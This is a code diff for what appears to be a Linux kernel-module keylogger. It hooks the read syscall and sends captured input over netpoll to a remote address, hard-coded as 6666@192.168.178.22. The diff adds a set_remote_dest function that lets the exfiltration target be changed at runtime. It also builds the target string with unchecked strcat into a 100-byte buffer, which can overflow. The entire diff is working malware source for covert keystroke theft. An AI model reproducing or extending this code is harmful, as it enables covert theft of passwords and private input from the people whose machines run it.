@@ -54,7 +54,7 @@ int network_keylogging_exit(void);
 
 asmlinkage long network_keylogging_read_syscall(unsigned int, char __user *, size_t, long ret);
 
-static void netlogger_init(void);
+static void netlogger_init(char *);
 static void netlogger_exit(void);
 static void netlogger_send(int, char *, unsigned int);
 
@@ -71,7 +71,7 @@ int network_keylogging_init(int debug_mode_on)
 {
 	show_debug_messages = debug_mode_on;
 
-	netlogger_init();
+	netlogger_init("6666@192.168.178.22");
 
 	register_callback(__NR_read, (void *) network_keylogging_read_syscall);
 
@@ -96,6 +96,13 @@ int network_keylogging_exit(void)
 	return 0;
 }
 
+void set_remote_dest(char *remote_ip_and_port)
+{
+	if (np)
+		netlogger_exit();
+
+	netlogger_init(remote_ip_and_port);
+}
 
 asmlinkage long network_keylogging_read_syscall(unsigned int fd, char __user *buf, size_t count, long ret)
 {
@@ -108,10 +115,23 @@ asmlinkage long network_keylogging_read_syscall(unsigned int fd, char __user *bu
 	return ret;
 }
 
-
-static void netlogger_init(void)
+static void netlogger_exit(void)
 {
-	char target_config[] = "6665@0.0.0.0/eth0,6666@192.168.178.22/ff:ff:ff:ff:ff:ff";
+	if (!np)
+		return;
+
+	netpoll_cleanup(np);
+	kfree(np);
+	np = NULL;
+}
+
+static void netlogger_init(char *remote_ip_and_port)
+{
+	char target_config[100] = "6665@0.0.0.0/eth0,";
+
+	strcat(target_config, remote_ip_and_port);
+	strcat(target_config, "/ff:ff:ff:ff:ff:ff");
+
 	if (np)
 		return;
 
@@ -134,16 +154,6 @@ static void netlogger_init(void)
 	return;
 }
 
-
-static void netlogger_exit(void)
-{
-	if (!np)
-		return;
-
-	netpoll_cleanup(np);
-	kfree(np);
-	np = NULL;
-}
 
 
 static void netlogger_send(int pid, char *buf, unsigned int len)
